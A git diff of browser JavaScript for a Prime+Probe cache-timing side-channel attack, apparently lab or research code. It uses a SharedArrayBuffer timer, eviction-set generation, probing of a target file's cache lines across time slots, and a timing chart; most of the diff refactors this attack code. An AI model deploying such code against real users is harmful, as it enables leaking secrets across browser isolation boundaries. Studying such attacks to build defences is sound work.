@@ -1,6 +1,7 @@
 const CACHE_LINE_SIZE = 64
 const CACHE_ASSOCIATIVITY = 12
 const sab = new Uint32Array(new SharedArrayBuffer(8))
+const candidateBuffer = new Uint8Array(6291456);
 
 async function getTargetArrayBuffer() {
   const response = await fetch("/target_file")
@@ -38,7 +39,7 @@ function initializeTimer(cb) {
 
   if(window.Worker) {
     sab[0] = 0
-    console.log("initializing worker")
+    console.log("initializing timer")
     const worker = new Worker("counter.js");
 
     worker.onmessage = (event) => {
@@ -57,25 +58,15 @@ function getTime() {
 
 class ListNode {
   next = null;
-  prev = null;
-  index;
   offset;
 
-  constructor(offset, index) {
+  constructor(offset) {
     this.offset = offset
-    this.index = index
-  }
-  getIndex() {
-    return this.index;
-  }
-  getOffset() {
-    return this.offset;
   }
 }
 
 class List {
   start = null;
-  end = null
   size = 0;
 
   copy() {
@@ -84,21 +75,20 @@ class List {
       newList.addOffset(node.offset);
     }
     return newList;
-  }
+  } 
   addOffset(offset) {
-    const newNode = new ListNode(offset, this.size);
-    if(!this.start) {
+    const newNode = new ListNode(offset);
+    if(!this.size) {
       this.start = newNode;
-      this.end = newNode;
     } else {
-      this.end.next = newNode;
-      newNode.prev = this.end;
-      this.end = newNode;
+      newNode.next = this.start;
+      this.start = newNode;
     }
     this.size++;
   }
   getRandomNode() {
-    return this.getNode(this.getRandomIndex())
+    const randomIndex = Math.round(Math.random() * (this.size - 1))
+    return this.getNode(randomIndex)
   }
   getNode(index) {
     let node = this.start;
@@ -107,23 +97,11 @@ class List {
     }
     return node;
   }
-  getRandomIndex() {
-    return Math.round(Math.random() * (this.size - 1))
-  }
-  filter(func) {
-    const newList = new List();
+  evict() {
     for(let node = this.start; node; node = node.next) {
-      if(func(node)) {
-        newList.addOffset(node.offset);
-      }
-    }
-    return newList;
-  }
-  evict(target) {
-    for(let node = this.start; node; node = node.next) {
-      let a = target[node.offset]
-      let b = a
-      a = b
+      let a = candidateBuffer[node.offset];
+      let b = a;
+      a = b;
     }
   }
 
@@ -139,47 +117,20 @@ class List {
   }
 }
 
-function isValidEvictionSet(evictionSet, target, offset, threshold) {
-  evictionSet.evict(target)
-  const start = getTime()
-  let a = target[offset]
-  let b = a
-  a = b
-  const t = getTime() - start;
-  return threshold < t
-}
-
 function generateCandidateSet() {
-  const candidateBuffer = new ArrayBuffer(1000000);
   let list = new List();
-  for(let i = 0; i < candidateBuffer.byteLength; i+=CACHE_LINE_SIZE) {
-    list.addOffset(i)
+  const numberOfCandidates = Math.round(candidateBuffer.byteLength / CACHE_LINE_SIZE);
+  const candidates = new Array(numberOfCandidates);
+  for(let i = 0; i < numberOfCandidates; i++) {
+    candidates[i] = (i * CACHE_LINE_SIZE) + 32;
+  }
+  for(let i = 0; i < numberOfCandidates; i++) {
+    const index = Math.round(Math.random() * (candidates.length-1));
+    const offset = candidates[index]
+    candidates.splice(index, 1)
+    list.addOffset(offset)
   }
   return list
-}
-
-function generateEvictionSet(target, offset, candidateSet, threshold) {
-  // naive eviction set generation
-  const ev = new List();
-
-  while(!ev || ev.size < CACHE_ASSOCIATIVITY) {
- 
-    const randomOffset = candidateSet.getRandomNode().offset
-    const withoutCandidate = candidateSet.filter((l) => l.offset != randomOffset)
-    if(isValidEvictionSet(List.union(ev, withoutCandidate), target, offset, threshold)) {
-      ev.addOffset(randomOffset)
-    }
-    candidateSet = withoutCandidate
-  }
-  return ev
-}
-
-function generateConflictSet(evictionSets) {
-  let union = evictionSets[0].copy()
-  for(let i = 1; i < evictionSets.length; i++) {
-    union = List.union(union, evictionSets[i])
-  }
-  return union
 }
 
 function probe(target, offset) {
@@ -191,8 +142,48 @@ function probe(target, offset) {
   return t
 }
 
-function wait(n_cycles) {
-  for(let i = 0; i < n_cycles; i++) {}
+function getSlowTime(evictionSet, target, offset) {
+  evictionSet.evict()
+  return probe(target, offset)
+}
+
+function getAverageSlowTime(evictionSet, target, offset, numberOfTests) {
+  let sum = 0;
+  for(let node = evictionSet.start; node; node = node.next) {
+    sum += getSlowTime(evictionSet, target, offset)
+  }
+  return sum/numberOfTests
+}
+
+function generateEvictionSet(target, offset, candidateSet, threshold) {
+  // naive eviction set generation
+  const ev = new List();
+
+  while(ev.size < CACHE_ASSOCIATIVITY && candidateSet.size > 1) {
+ 
+    const randomOffset = candidateSet.start.offset
+    candidateSet.start = candidateSet.start.next;
+    candidateSet.size--;
+
+    if(threshold < getSlowTime(List.union(ev, candidateSet), target, offset)) {
+      ev.addOffset(randomOffset)
+      console.log("added offset:", offset, "candidateSet.size:", candidateSet.size, "evictionSet.size:", ev.size);
+    }
+    if(candidateSet.size % 100 == 0) console.log("candidateSet.size left:", candidateSet.size);
+  }
+  return ev
+}
+
+function generateConflictSet(evictionSets) {
+  let union = evictionSets[0]
+  for(let i = 1; i < evictionSets.length; i++) {
+    union = List.union(union, evictionSets[i])
+  }
+  return union
+}
+
+function wait(numberOfCycles) {
+  for(let i = 0; i < numberOfCycles; i++) {}
 }
 
 function attack() {
@@ -215,33 +206,32 @@ async function _attack() {
   console.log("generating eviction sets")
   const evictionSets = new Array(config.probe.length)
   for(let i = 0; i < config.probe.length; i++) {
-    evictionSets[i] = generateEvictionSet(target, config.probe[i], candidateSet, config.threshold);
+    evictionSets[i] = generateEvictionSet(target, config.probe[i], candidateSet.copy(), config.threshold);
+    console.log(`eviction set[${i}] found!`)
   }
   console.log(evictionSets)
   console.log("generating conflict set")
   const conflictSet = generateConflictSet(evictionSets)
   console.log("initiating attack")
-  // fetch("/encrypt", {method: "POST"})
   const results = new Array(config.time_slots)
   for(let i = 0; i < config.time_slots; i++) {
-    results[i] = new Array(config.probe.length).fill(0)
+    results[i] = new Uint32Array(config.probe.length).fill(89)
   }
 
+  // fetch("/encrypt", {method: "POST"})
   for(let time_slot = 0; time_slot < config.time_slots; time_slot++) {
     const start = getTime();
     for(let addr = 0; addr < config.probe.length; addr++) {
-      const addr_idx = config.probe.length - addr - 1;
-      const t = probe(target, config.probe[addr_idx])
-      results[time_slot][addr_idx] = t;
+      const t = probe(target, config.probe[addr])
+      results[time_slot][addr] = t;
     }
-    conflictSet.evict(target)
+    conflictSet.evict()
     while(getTime() - start < config.time_slot_size) {
       wait(config.wait_cycles);
     }
   }
   console.log("attack is done")
 
-  console.log(results)
   new Chart(document.getElementById("results"), {
     type: 'scatter',
     data: {
@@ -264,7 +254,7 @@ async function _attack() {
     options: {
       scales: {
         y: {
-          max: 500
+          max: 100
         },
         x: {
           type: 'linear',
@@ -277,5 +267,5 @@ async function _attack() {
 
 window.onload = () => {
   document.getElementById("btn-start-attack").onclick = attack;
-  attack();
+  document.getElementById("btn-reload").onclick = () => window.location.reload();
 }
